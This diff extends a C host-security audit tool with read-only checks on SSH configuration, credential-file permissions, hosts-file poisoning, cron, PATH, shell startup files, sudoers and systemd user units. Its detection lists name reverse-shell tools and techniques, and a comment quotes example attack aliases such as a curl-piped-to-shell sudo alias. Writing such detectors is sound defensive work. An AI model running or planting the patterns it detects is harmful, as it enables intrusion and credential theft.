@@ -8,6 +8,9 @@
  *   A3. DNS/hosts poisoning   — /etc/hosts entries for banking/exchange domains
  *   A4. Cron persistence      — suspicious cron entries (wget, curl|sh, base64)
  *   A5. Firewall status       — iptables/nftables rule count
+ *   A6. Shell startup-file backdoors — ~/.bashrc, ~/.profile, etc.
+ *   A7. Sudoers NOPASSWD      — privilege escalation via passwordless sudo
+ *   A8. Systemd user-unit persistence — $HOME/.config/systemd/user/ units
  *
  * All checks are read-only and non-destructive.
  * No network access. No root required (though some checks are richer
@@ -30,6 +33,7 @@
 #include <pwd.h>
 
 #include "hlse_audit.h"
+#include "hlse_util.h"
 
 /* ─── helpers ─────────────────────────────────────────────────────────── */
 
@@ -50,7 +54,7 @@ av_add(AuditVerdict *v, int delta, AuditSeverity sev,
 
 static int
 file_contains(const char *path, const char *needle) {
-    FILE *fp = fopen(path, "r");
+    FILE *fp = hlse_open_system_file(path);
     char line[2048];
     if (!fp) return -1; /* cannot read */
     while (fgets(line, sizeof(line), fp)) {
@@ -73,7 +77,7 @@ hlse_audit_ssh(void) {
 
     /* Check sshd_config */
     {
-        FILE *fp = fopen(sshd_conf, "r");
+        FILE *fp = hlse_open_system_file(sshd_conf);
         if (!fp) {
             av_add(&v, 0, AUDIT_INFO, "A1: Cannot read %s (no SSH server?)",
                    sshd_conf);
@@ -103,6 +107,48 @@ hlse_audit_ssh(void) {
                     if (strstr(p, "yes")) {
                         av_add(&v, 20, AUDIT_MEDIUM,
                             "A1: PasswordAuthentication yes — brute-force risk");
+                    }
+                }
+                if (strncmp(p, "Protocol", 8) == 0 && strstr(p, "1")) {
+                    av_add(&v, 40, AUDIT_HIGH,
+                        "A1: Protocol 1 enabled — SSHv1 is cryptographically broken");
+                }
+                if (strncmp(p, "MaxAuthTries", 12) == 0) {
+                    int tries = 0;
+                    const char *tp = p + 12;
+                    while (*tp == ' ' || *tp == '\t') tp++;
+                    tries = atoi(tp);
+                    if (tries > 3) {
+                        av_add(&v, 10, AUDIT_LOW,
+                            "A1: MaxAuthTries %d > 3 — consider reducing to "
+                            "limit brute-force attempts", tries);
+                    }
+                }
+                if (strncmp(p, "PermitEmptyPasswords", 20) == 0
+                    && strstr(p, "yes")) {
+                    av_add(&v, 50, AUDIT_HIGH,
+                        "A1: PermitEmptyPasswords yes — accounts with no "
+                        "password are accessible over SSH");
+                }
+                if (strncmp(p, "X11Forwarding", 13) == 0 && strstr(p, "yes")) {
+                    av_add(&v, 15, AUDIT_MEDIUM,
+                        "A1: X11Forwarding yes — enables display forwarding "
+                        "which can be abused for screen capture / keylogging");
+                }
+                if (strncmp(p, "AllowTcpForwarding", 18) == 0 && strstr(p, "yes")) {
+                    av_add(&v, 15, AUDIT_MEDIUM,
+                        "A1: AllowTcpForwarding yes — enables TCP tunneling, "
+                        "allowing port-forwarding pivots through this host");
+                }
+                if (strncmp(p, "LoginGraceTime", 14) == 0) {
+                    int grace = 0;
+                    const char *gp = p + 14;
+                    while (*gp == ' ' || *gp == '\t') gp++;
+                    grace = atoi(gp);
+                    if (grace > 60 || grace == 0) {
+                        av_add(&v, 5, AUDIT_LOW,
+                            "A1: LoginGraceTime %d — consider setting to 30s "
+                            "to limit connection slot exhaustion", grace);
                     }
                 }
             }
@@ -167,18 +213,52 @@ hlse_audit_permissions(void) {
         }
     }
 
-    /* Check home directory .env files */
+    /* Check home directory credential and key files */
     {
         const char *home = getenv("HOME");
         if (home) {
-            char path[512];
-            struct stat st;
-            snprintf(path, sizeof(path), "%s/.env", home);
-            if (stat(path, &st) == 0) {
-                if (st.st_mode & 0077) {
-                    av_add(&v, 25, AUDIT_HIGH,
-                        "A2: ~/.env is group/world-accessible (mode %04o)",
-                        st.st_mode & 0777);
+            /* { relative path, max permissive bits, score, description } */
+            static const struct {
+                const char *rel;
+                unsigned    bad_bits;  /* mode bits that trigger alert */
+                int         score;
+                const char *label;
+            } HOME_SECRETS[] = {
+                { ".env",              0077, 25, "A2: ~/.env is group/world-accessible" },
+                { ".aws/credentials",  0077, 35, "A2: ~/.aws/credentials is group/world-accessible" },
+                { ".ssh/id_rsa",       0077, 40, "A2: SSH private key ~/.ssh/id_rsa is group/world-accessible" },
+                { ".ssh/id_ed25519",   0077, 40, "A2: SSH private key ~/.ssh/id_ed25519 is group/world-accessible" },
+                { ".ssh/id_ecdsa",     0077, 40, "A2: SSH private key ~/.ssh/id_ecdsa is group/world-accessible" },
+                { ".netrc",            0077, 35, "A2: ~/.netrc (FTP/curl credentials) is group/world-accessible" },
+                { ".pgpass",           0077, 30, "A2: ~/.pgpass (PostgreSQL passwords) is group/world-accessible" },
+                { ".gnupg/secring.gpg",0077, 35, "A2: GPG secret keyring is group/world-accessible" },
+                /* Container / cloud / package credential files */
+                { ".docker/config.json", 0077, 35, "A2: ~/.docker/config.json (Docker auth) is group/world-accessible" },
+                { ".kube/config",        0077, 40, "A2: ~/.kube/config (Kubernetes credentials) is group/world-accessible" },
+                { ".npmrc",              0077, 30, "A2: ~/.npmrc (npm auth token) is group/world-accessible" },
+                { ".pypirc",             0077, 25, "A2: ~/.pypirc (PyPI credentials) is group/world-accessible" },
+                { ".git-credentials",    0077, 35, "A2: ~/.git-credentials (Git HTTP credentials) is group/world-accessible" },
+                /* Cloud SDK credential files */
+                { ".config/gcloud/application_default_credentials.json",
+                                         0077, 40, "A2: GCP application_default_credentials is group/world-accessible" },
+                { ".config/gh/hosts.yml",0077, 35, "A2: GitHub CLI credentials (~/.config/gh/hosts.yml) is group/world-accessible" },
+                { ".terraform.d/credentials.tfrc.json",
+                                         0077, 35, "A2: Terraform Cloud token is group/world-accessible" },
+                { ".azure/credentials",  0077, 35, "A2: Azure CLI credentials (~/.azure/credentials) is group/world-accessible" },
+                { ".heroku/credentials.json",
+                                         0077, 30, "A2: Heroku credentials are group/world-accessible" },
+                { NULL, 0, 0, NULL }
+            };
+            int i;
+            for (i = 0; HOME_SECRETS[i].rel; i++) {
+                char path[512];
+                struct stat st;
+                snprintf(path, sizeof(path), "%s/%s", home, HOME_SECRETS[i].rel);
+                if (stat(path, &st) == 0 &&
+                    (st.st_mode & HOME_SECRETS[i].bad_bits)) {
+                    av_add(&v, HOME_SECRETS[i].score, AUDIT_HIGH,
+                        "%s (mode %04o)",
+                        HOME_SECRETS[i].label, st.st_mode & 0777);
                 }
             }
         }
@@ -192,19 +272,41 @@ hlse_audit_permissions(void) {
  * ═══════════════════════════════════════════════════════════════════════ */
 
 static const char *SENSITIVE_DOMAINS[] = {
-    /* Banks */
+    /* US Banks */
     "chase.com", "bankofamerica.com", "wellsfargo.com", "citibank.com",
     "hsbc.com", "barclays.co.uk",
+    /* EU Banks */
+    "ing.com", "bnpparibas.com", "deutschebank.com", "unicredit.eu",
+    "santander.com", "bbva.com",
     /* JP banks */
     "mizuhobank.co.jp", "smbc.co.jp", "bk.mufg.jp",
     "rakuten-bank.co.jp", "japannetbank.co.jp",
     /* Crypto exchanges */
     "coinbase.com", "binance.com", "kraken.com", "bitflyer.jp",
+    "bybit.com", "okx.com", "huobi.com", "kucoin.com",
+    "gate.io", "bitfinex.com", "gemini.com", "upbit.com",
+    /* US Banks (additional) */
+    "usbank.com", "capitalone.com", "truist.com",
     /* Payment */
-    "paypal.com", "stripe.com", "wise.com",
+    "paypal.com", "stripe.com", "wise.com", "cashapp.com", "cash.app",
+    "venmo.com", "zellepay.com",
+    /* Brokerages */
+    "robinhood.com", "etrade.com", "fidelity.com", "schwab.com",
+    "tdameritrade.com", "vanguard.com",
     /* Auth providers */
     "accounts.google.com", "login.microsoftonline.com",
-    "appleid.apple.com",
+    "appleid.apple.com", "icloud.com",
+    /* Cloud management consoles — high-value redirect targets */
+    "console.aws.amazon.com", "console.cloud.google.com", "portal.azure.com",
+    /* SSO/identity */
+    "github.com", "okta.com", "auth0.com",
+    /* Major social / communication auth targets */
+    "twitter.com", "x.com", "facebook.com", "instagram.com",
+    "discord.com", "telegram.org",
+    /* Subscription services — account credential theft */
+    "netflix.com", "spotify.com",
+    /* Hardware wallets / non-custodial */
+    "metamask.io", "ledger.com", "trezor.io",
     NULL
 };
 
@@ -216,7 +318,7 @@ hlse_audit_dns(void) {
 
     memset(&v, 0, sizeof(v));
 
-    fp = fopen("/etc/hosts", "r");
+    fp = hlse_open_system_file("/etc/hosts");
     if (!fp) {
         av_add(&v, 0, AUDIT_INFO, "A3: Cannot read /etc/hosts");
         return v;
@@ -237,7 +339,7 @@ hlse_audit_dns(void) {
             int i;
             char lower[1024];
             size_t k;
-            for (k = 0; p[k] && k < sizeof(lower) - 1; k++)
+            for (k = 0; k < sizeof(lower) - 1 && p[k]; k++)
                 lower[k] = (char)tolower((unsigned char)p[k]);
             lower[k] = '\0';
 
@@ -254,7 +356,7 @@ hlse_audit_dns(void) {
     fclose(fp);
 
     /* Check resolv.conf for suspicious DNS */
-    fp = fopen("/etc/resolv.conf", "r");
+    fp = hlse_open_system_file("/etc/resolv.conf");
     if (fp) {
         int nameserver_count = 0;
         while (fgets(line, sizeof(line), fp)) {
@@ -296,6 +398,12 @@ static const char *SUSPICIOUS_CRON_PATTERNS[] = {
     "eval(", "exec(",
     ".onion",
     "chmod 777", "chmod +s",
+    /* Additional reverse-shell and persistence patterns */
+    "bash -i", "socat ", "mkfifo ",
+    "ruby -e", "php -r", "node -e",
+    "openssl s_client", "telnet ",
+    "xterm -display",
+    "msfvenom", "meterpreter",
     NULL
 };
 
@@ -363,23 +471,38 @@ hlse_audit_cron(void) {
         }
     }
 
-    /* Also check /etc/cron.d/ */
+    /* Also check /etc/cron.d/ and related system cron locations */
     {
-        DIR *d = opendir("/etc/cron.d");
-        if (d) {
-            struct dirent *ent;
-            while ((ent = readdir(d)) != NULL) {
-                char path[512];
-                int i;
-                if (ent->d_name[0] == '.') continue;
-                snprintf(path, sizeof(path), "/etc/cron.d/%s", ent->d_name);
-                for (i = 0; SUSPICIOUS_CRON_PATTERNS[i]; i++) {
-                    int r = file_contains(path, SUSPICIOUS_CRON_PATTERNS[i]);
-                    if (r == 1) {
-                        av_add(&v, 35, AUDIT_HIGH,
-                            "A4: Suspicious pattern in /etc/cron.d/%s: '%s'",
-                            ent->d_name, SUSPICIOUS_CRON_PATTERNS[i]);
-                        break;
+        /* Directories containing cron-triggered scripts */
+        const char *cron_dirs[] = {
+            "/etc/cron.d",
+            "/etc/cron.hourly",
+            "/etc/cron.daily",
+            "/etc/cron.weekly",
+            "/etc/cron.monthly",
+            NULL
+        };
+        int ci;
+        for (ci = 0; cron_dirs[ci]; ci++) {
+            DIR *d = opendir(cron_dirs[ci]);
+            if (!d) continue;
+            {
+                struct dirent *ent;
+                while ((ent = readdir(d)) != NULL) {
+                    char path[512];
+                    int i;
+                    if (ent->d_name[0] == '.') continue;
+                    snprintf(path, sizeof(path), "%s/%s",
+                             cron_dirs[ci], ent->d_name);
+                    for (i = 0; SUSPICIOUS_CRON_PATTERNS[i]; i++) {
+                        int r = file_contains(path, SUSPICIOUS_CRON_PATTERNS[i]);
+                        if (r == 1) {
+                            av_add(&v, 35, AUDIT_HIGH,
+                                "A4: Suspicious pattern in %s/%s: '%s'",
+                                cron_dirs[ci], ent->d_name,
+                                SUSPICIOUS_CRON_PATTERNS[i]);
+                            break;
+                        }
                     }
                 }
             }
@@ -387,6 +510,466 @@ hlse_audit_cron(void) {
         }
     }
 
+    /* Check /etc/crontab (system-wide crontab, includes username field) */
+    {
+        FILE *fp = hlse_open_system_file("/etc/crontab");
+        if (fp) {
+            char line[2048];
+            while (fgets(line, sizeof(line), fp)) {
+                int i;
+                char *p = line;
+                while (*p == ' ' || *p == '\t') p++;
+                if (*p == '#' || *p == '\n') continue;
+                for (i = 0; SUSPICIOUS_CRON_PATTERNS[i]; i++) {
+                    if (strstr(p, SUSPICIOUS_CRON_PATTERNS[i])) {
+                        av_add(&v, 40, AUDIT_HIGH,
+                            "A4: Suspicious pattern in /etc/crontab: '%s'",
+                            SUSPICIOUS_CRON_PATTERNS[i]);
+                        break;
+                    }
+                }
+            }
+            fclose(fp);
+        }
+    }
+
+    return v;
+}
+
+/* ═══════════════════════════════════════════════════════════════════════
+ * A5: Insecure $PATH
+ *
+ * A writable or current-directory entry in PATH lets an attacker plant a
+ * binary that runs under the user's identity for any unqualified command.
+ * We flag two well-known footguns: '.' / an empty element (the current
+ * directory), and a world-writable directory without the sticky bit.
+ * User-owned dirs (e.g. ~/.local/bin) are intentionally NOT flagged.
+ * ═══════════════════════════════════════════════════════════════════════ */
+
+AuditVerdict
+hlse_audit_path(void) {
+    AuditVerdict v;
+    const char *path = getenv("PATH");
+    const char *s;
+    int flagged_cwd = 0;
+
+    memset(&v, 0, sizeof(v));
+    if (!path || !*path) {
+        av_add(&v, 0, AUDIT_INFO, "A5: PATH is empty or unset");
+        return v;
+    }
+
+    for (s = path; ; ) {
+        const char *colon = strchr(s, ':');
+        size_t len = colon ? (size_t)(colon - s) : strlen(s);
+
+        if (len == 0 || (len == 1 && s[0] == '.')) {
+            if (!flagged_cwd) {
+                av_add(&v, 30, AUDIT_HIGH,
+                    "A5: current directory ('.' or empty element) in PATH — "
+                    "a planted binary in any cwd can hijack commands");
+                flagged_cwd = 1;
+            }
+        } else if (len < 1024) {
+            char dir[1024];
+            struct stat st;
+            memcpy(dir, s, len);
+            dir[len] = '\0';
+            if (stat(dir, &st) == 0 && S_ISDIR(st.st_mode) &&
+                (st.st_mode & S_IWOTH) && !(st.st_mode & S_ISVTX)) {
+                av_add(&v, 35, AUDIT_HIGH,
+                    "A5: world-writable directory in PATH: %.180s (mode %04o)",
+                    dir, (unsigned)(st.st_mode & 07777));
+            }
+        }
+
+        if (!colon) break;
+        s = colon + 1;
+    }
+
+    if (v.n_findings == 0)
+        av_add(&v, 0, AUDIT_PASS, "A5: PATH has no writable or '.' entries");
+    return v;
+}
+
+/* ═══════════════════════════════════════════════════════════════════════
+ * A6: Shell startup-file backdoors
+ *
+ * Appending to ~/.bashrc / ~/.zshrc / ~/.profile is a classic, low-effort
+ * persistence and reverse-shell mechanism. We scan the common login/rc files
+ * for a small set of HIGH-confidence execution patterns; benign rc lines do
+ * not contain reverse-shell device paths or download-piped-to-shell.
+ * ═══════════════════════════════════════════════════════════════════════ */
+
+AuditVerdict
+hlse_audit_shellrc(void) {
+    AuditVerdict v;
+    const char *home = getenv("HOME");
+    const char *files[] = {
+        ".bashrc", ".bash_profile", ".bash_login", ".bash_logout",
+        ".profile", ".zshrc", ".zprofile", ".zlogin", ".zlogout",
+        ".config/fish/config.fish", NULL
+    };
+    int fi;
+
+    memset(&v, 0, sizeof(v));
+    if (!home) {
+        av_add(&v, 0, AUDIT_INFO, "A6: HOME unset — cannot check shell rc files");
+        return v;
+    }
+
+    for (fi = 0; files[fi]; fi++) {
+        char path[512];
+        FILE *fp;
+        char line[2048];
+        int lineno = 0;
+
+        snprintf(path, sizeof(path), "%s/%s", home, files[fi]);
+        fp = hlse_open_system_file(path);   /* follows symlinked dotfiles */
+        if (!fp) continue;
+
+        while (fgets(line, sizeof(line), fp)) {
+            char *p = line;
+            lineno++;
+            while (*p == ' ' || *p == '\t') p++;
+            if (*p == '#' || *p == '\n' || *p == '\0') continue;
+
+            if (strstr(p, "/dev/tcp/") || strstr(p, "/dev/udp/")) {
+                av_add(&v, 45, AUDIT_CRITICAL,
+                    "A6: reverse-shell device path (/dev/tcp) in ~/%s:%d",
+                    files[fi], lineno);
+            }
+            if (strstr(p, "nc -e") || strstr(p, "ncat -e") ||
+                strstr(p, "nc.traditional -e")) {
+                av_add(&v, 40, AUDIT_CRITICAL,
+                    "A6: netcat -e reverse shell in ~/%s:%d", files[fi], lineno);
+            }
+            if ((strstr(p, "curl ") || strstr(p, "wget ")) &&
+                (strstr(p, "| sh")   || strstr(p, "|sh") ||
+                 strstr(p, "| bash") || strstr(p, "|bash"))) {
+                av_add(&v, 35, AUDIT_HIGH,
+                    "A6: download-piped-to-shell in ~/%s:%d "
+                    "(persistence/backdoor)", files[fi], lineno);
+            }
+            if (strstr(p, "LD_PRELOAD=")) {
+                av_add(&v, 20, AUDIT_MEDIUM,
+                    "A6: LD_PRELOAD set in ~/%s:%d — verify the library is "
+                    "trusted", files[fi], lineno);
+            }
+            if (strstr(p, "socat ") &&
+                (strstr(p, "exec:") || strstr(p, "/bin/sh") ||
+                 strstr(p, "/bin/bash"))) {
+                av_add(&v, 45, AUDIT_CRITICAL,
+                    "A6: socat reverse shell in ~/%s:%d", files[fi], lineno);
+            }
+            if (strstr(p, "bash -i") || strstr(p, "bash -c")) {
+                av_add(&v, 30, AUDIT_HIGH,
+                    "A6: interactive shell invocation in ~/%s:%d",
+                    files[fi], lineno);
+            }
+            if (strstr(p, "mkfifo ") &&
+                (strstr(p, "nc ") || strstr(p, "ncat ") ||
+                 strstr(p, "bash") || strstr(p, "sh"))) {
+                av_add(&v, 45, AUDIT_CRITICAL,
+                    "A6: named-pipe reverse shell (mkfifo+nc) in ~/%s:%d",
+                    files[fi], lineno);
+            }
+            /* PROMPT_COMMAND injection — every command prompt executes payload */
+            if (strstr(p, "PROMPT_COMMAND") &&
+                (strstr(p, "curl ") || strstr(p, "wget ") ||
+                 strstr(p, "/dev/tcp") || strstr(p, "nc ") ||
+                 strstr(p, "eval ") || strstr(p, "base64"))) {
+                av_add(&v, 40, AUDIT_CRITICAL,
+                    "A6: PROMPT_COMMAND injection in ~/%s:%d — "
+                    "payload runs on every shell prompt", files[fi], lineno);
+            }
+            /* function() override of system commands — rootkit-style hiding */
+            if (strncmp(p, "function ", 9) == 0 || strncmp(p, "function\t", 9) == 0) {
+                /* common commands hijacked to hide malware from ps/ls/top */
+                static const char *hid[] = {
+                    "ls(", "ps(", "top(", "netstat(", "ss(", "lsof(",
+                    "find(", "grep(", "who(", "id(", "ifconfig(", NULL
+                };
+                int hi;
+                for (hi = 0; hid[hi]; hi++) {
+                    if (strstr(p, hid[hi])) {
+                        av_add(&v, 35, AUDIT_HIGH,
+                            "A6: system command '%.*s' overridden by shell "
+                            "function in ~/%s:%d — possible rootkit persistence",
+                            (int)(strchr(hid[hi], '(') - hid[hi]),
+                            hid[hi], files[fi], lineno);
+                        break;
+                    }
+                }
+            }
+            /* alias hijacking of system commands — rootkit-style hiding.
+             * e.g. alias ls='ls | grep -v malware' to hide files, or
+             * alias sudo='curl evil|sh; sudo' to steal credentials. */
+            if (strncmp(p, "alias ", 6) == 0 || strncmp(p, "alias\t", 6) == 0) {
+                static const char *halias[] = {
+                    "ls=", "ps=", "top=", "netstat=", "ss=", "lsof=",
+                    "find=", "grep=", "sudo=", "ssh=", "cat=", "cd=", NULL
+                };
+                int hi;
+                for (hi = 0; halias[hi]; hi++) {
+                    const char *a = strstr(p, halias[hi]);
+                    /* the aliased target must invoke something dangerous */
+                    if (a && (strstr(p, "curl") || strstr(p, "wget") ||
+                              strstr(p, "/dev/tcp") || strstr(p, "nc ") ||
+                              strstr(p, "eval") || strstr(p, "base64") ||
+                              strstr(p, "grep -v") || strstr(p, "| grep") ||
+                              strstr(p, "python") || strstr(p, "/tmp/"))) {
+                        av_add(&v, 35, AUDIT_HIGH,
+                            "A6: system command '%.*s' hijacked by alias in "
+                            "~/%s:%d — possible rootkit/credential theft",
+                            (int)(strchr(halias[hi], '=') - halias[hi]),
+                            halias[hi], files[fi], lineno);
+                        break;
+                    }
+                }
+            }
+        }
+        fclose(fp);
+    }
+
+    /* /etc/profile.d/ — system-wide shell init scripts, all-user scope.
+     * Malware dropped here runs for every interactive shell login.       */
+    {
+        DIR *d = opendir("/etc/profile.d");
+        if (d) {
+            struct dirent *ent;
+            while ((ent = readdir(d)) != NULL) {
+                char path[512];
+                FILE *fp;
+                char line[2048];
+                int lineno = 0;
+
+                if (ent->d_name[0] == '.') continue;
+                snprintf(path, sizeof(path), "/etc/profile.d/%s", ent->d_name);
+                fp = hlse_open_system_file(path);
+                if (!fp) continue;
+
+                while (fgets(line, sizeof(line), fp)) {
+                    char *p = line;
+                    lineno++;
+                    while (*p == ' ' || *p == '\t') p++;
+                    if (*p == '#' || *p == '\n' || *p == '\0') continue;
+
+                    if (strstr(p, "/dev/tcp/") || strstr(p, "/dev/udp/")) {
+                        av_add(&v, 55, AUDIT_CRITICAL,
+                            "A6: reverse-shell device path in system-wide "
+                            "/etc/profile.d/%s:%d (affects ALL users)",
+                            ent->d_name, lineno);
+                    }
+                    if ((strstr(p, "curl ") || strstr(p, "wget ")) &&
+                        (strstr(p, "| sh")   || strstr(p, "|sh") ||
+                         strstr(p, "| bash") || strstr(p, "|bash"))) {
+                        av_add(&v, 50, AUDIT_CRITICAL,
+                            "A6: download-piped-to-shell in system-wide "
+                            "/etc/profile.d/%s:%d (affects ALL users)",
+                            ent->d_name, lineno);
+                    }
+                    if (strstr(p, "nc -e") || strstr(p, "socat ")) {
+                        av_add(&v, 50, AUDIT_CRITICAL,
+                            "A6: reverse-shell tool in system-wide "
+                            "/etc/profile.d/%s:%d (affects ALL users)",
+                            ent->d_name, lineno);
+                    }
+                }
+                fclose(fp);
+            }
+            closedir(d);
+        }
+    }
+
+    if (v.n_findings == 0)
+        av_add(&v, 0, AUDIT_PASS,
+               "A6: No backdoor patterns in shell startup files");
+    return v;
+}
+
+/* ═══════════════════════════════════════════════════════════════════════
+ * A7: Sudoers NOPASSWD check
+ *
+ * A NOPASSWD entry in sudoers lets any process running as that user run
+ * arbitrary commands as root without a password prompt — effectively
+ * root-without-password on the affected user account. Flag both the main
+ * sudoers file and any drop-in under /etc/sudoers.d/.
+ * ═══════════════════════════════════════════════════════════════════════ */
+
+AuditVerdict
+hlse_audit_sudoers(void) {
+    AuditVerdict v;
+    memset(&v, 0, sizeof(v));
+
+    /* Main sudoers file */
+    {
+        FILE *fp = hlse_open_system_file("/etc/sudoers");
+        if (fp) {
+            char line[2048];
+            int lineno = 0;
+            while (fgets(line, sizeof(line), fp)) {
+                lineno++;
+                /* Skip comments and whitespace lines */
+                {
+                    char *p = line;
+                    while (*p == ' ' || *p == '\t') p++;
+                    if (*p == '#' || *p == '\n' || *p == '\0') continue;
+                }
+                if (strstr(line, "NOPASSWD") && !strstr(line, "#")) {
+                    /* Strip trailing newline for cleaner output */
+                    char *nl = strchr(line, '\n');
+                    if (nl) *nl = '\0';
+                    av_add(&v, 40, AUDIT_HIGH,
+                        "A7: NOPASSWD in /etc/sudoers:%d — "
+                        "passwordless sudo: %.120s", lineno, line);
+                }
+            }
+            fclose(fp);
+        }
+    }
+
+    /* Drop-in files under /etc/sudoers.d/ */
+    {
+        DIR *d = opendir("/etc/sudoers.d");
+        if (d) {
+            struct dirent *ent;
+            while ((ent = readdir(d)) != NULL) {
+                char path[512];
+                FILE *fp;
+                struct stat st;
+                if (ent->d_name[0] == '.') continue;
+                snprintf(path, sizeof(path), "/etc/sudoers.d/%s", ent->d_name);
+                if (stat(path, &st) != 0 || !S_ISREG(st.st_mode)) continue;
+                fp = hlse_open_system_file(path);
+                if (!fp) continue;
+                {
+                    char line[2048];
+                    int lineno = 0;
+                    while (fgets(line, sizeof(line), fp)) {
+                        lineno++;
+                        {
+                            char *p = line;
+                            while (*p == ' ' || *p == '\t') p++;
+                            if (*p == '#' || *p == '\n' || *p == '\0') continue;
+                        }
+                        if (strstr(line, "NOPASSWD") && !strstr(line, "#")) {
+                            char *nl = strchr(line, '\n');
+                            if (nl) *nl = '\0';
+                            av_add(&v, 40, AUDIT_HIGH,
+                                "A7: NOPASSWD in /etc/sudoers.d/%s:%d — "
+                                "passwordless sudo: %.100s",
+                                ent->d_name, lineno, line);
+                        }
+                    }
+                }
+                fclose(fp);
+            }
+            closedir(d);
+        }
+    }
+
+    if (v.n_findings == 0)
+        av_add(&v, 0, AUDIT_PASS,
+               "A7: No NOPASSWD entries found in sudoers");
+    return v;
+}
+
+/* ═══════════════════════════════════════════════════════════════════════
+ * A8: Systemd User-Unit Persistence Detection
+ *
+ * Attackers plant backdoors as $HOME/.config/systemd/user/ .service files to
+ * survive reboots without root. This check scans that directory for unit files
+ * the same dangerous ExecStart patterns that A4 watches in cron.
+ * ═══════════════════════════════════════════════════════════════════════ */
+
+AuditVerdict
+hlse_audit_systemd_user(void) {
+    AuditVerdict v;
+    const char *home;
+    char unit_dir[512];
+    DIR *d;
+
+    memset(&v, 0, sizeof(v));
+
+    home = getenv("HOME");
+    if (!home || !home[0]) {
+        struct passwd *pw = getpwuid(getuid());
+        if (pw) home = pw->pw_dir;
+    }
+    if (!home || !home[0]) {
+        av_add(&v, 0, AUDIT_INFO, "A8: HOME unset — cannot check systemd user units");
+        return v;
+    }
+
+    snprintf(unit_dir, sizeof(unit_dir), "%s/.config/systemd/user", home);
+    d = opendir(unit_dir);
+    if (!d) {
+        av_add(&v, 0, AUDIT_PASS, "A8: No user systemd unit directory found");
+        return v;
+    }
+
+    {
+        struct dirent *ent;
+        int found_suspicious = 0;
+
+        while ((ent = readdir(d)) != NULL) {
+            char path[640];
+            int fd;
+            FILE *fp;
+            struct stat st;
+            char line[2048];
+            size_t nlen;
+
+            if (ent->d_name[0] == '.') continue;
+
+            /* Only examine .service, .timer, .socket unit files */
+            nlen = strlen(ent->d_name);
+            if (nlen < 8) continue;
+            {
+                const char *e = ent->d_name + nlen;
+                int is_unit = (strcmp(e - 8, ".service") == 0)
+                           || (strcmp(e - 6, ".timer") == 0)
+                           || (strcmp(e - 7, ".socket") == 0);
+                if (!is_unit) continue;
+            }
+
+            snprintf(path, sizeof(path), "%s/%s", unit_dir, ent->d_name);
+            fd = open(path, O_RDONLY | O_NOFOLLOW | O_NONBLOCK);
+            if (fd < 0) continue;
+            if (fstat(fd, &st) != 0 || !S_ISREG(st.st_mode)) {
+                close(fd); continue;
+            }
+            fp = fdopen(fd, "r");
+            if (!fp) { close(fd); continue; }
+
+            while (fgets(line, sizeof(line), fp)) {
+                int i;
+                char *p = line;
+                /* Only scan ExecStart/ExecStartPre lines */
+                if (strncmp(p, "ExecStart", 9) != 0 &&
+                    strncmp(p, "ExecStartPre", 12) != 0 &&
+                    strncmp(p, "ExecStop", 8) != 0) continue;
+
+                for (i = 0; SUSPICIOUS_CRON_PATTERNS[i]; i++) {
+                    if (strstr(p, SUSPICIOUS_CRON_PATTERNS[i])) {
+                        av_add(&v, 40, AUDIT_HIGH,
+                            "A8: Suspicious ExecStart in user unit %s: %.60s",
+                            ent->d_name, p);
+                        found_suspicious = 1;
+                        break;
+                    }
+                }
+            }
+            fclose(fp);
+        }
+
+        if (!found_suspicious) {
+            av_add(&v, 0, AUDIT_PASS,
+                   "A8: No suspicious ExecStart patterns in user systemd units");
+        }
+    }
+    closedir(d);
     return v;
 }
 
@@ -397,7 +980,7 @@ hlse_audit_cron(void) {
 AuditVerdict
 hlse_audit_all(void) {
     AuditVerdict combined;
-    AuditVerdict parts[4];
+    AuditVerdict parts[8];
     int n = 0, i, j;
 
     memset(&combined, 0, sizeof(combined));
@@ -406,6 +989,10 @@ hlse_audit_all(void) {
     parts[n++] = hlse_audit_permissions();
     parts[n++] = hlse_audit_dns();
     parts[n++] = hlse_audit_cron();
+    parts[n++] = hlse_audit_path();
+    parts[n++] = hlse_audit_shellrc();
+    parts[n++] = hlse_audit_sudoers();
+    parts[n++] = hlse_audit_systemd_user();
 
     for (i = 0; i < n; i++) {
         for (j = 0; j < parts[i].n_findings
@@ -417,4 +1004,14 @@ hlse_audit_all(void) {
     }
     if (combined.score > 100) combined.score = 100;
     return combined;
+}
+
+int
+hlse_audit_hardening_index(const AuditVerdict *v) {
+    int risk;
+    if (!v) return 0;
+    risk = v->score;
+    if (risk < 0) risk = 0;
+    if (risk > 100) risk = 100;
+    return 100 - risk;
 }
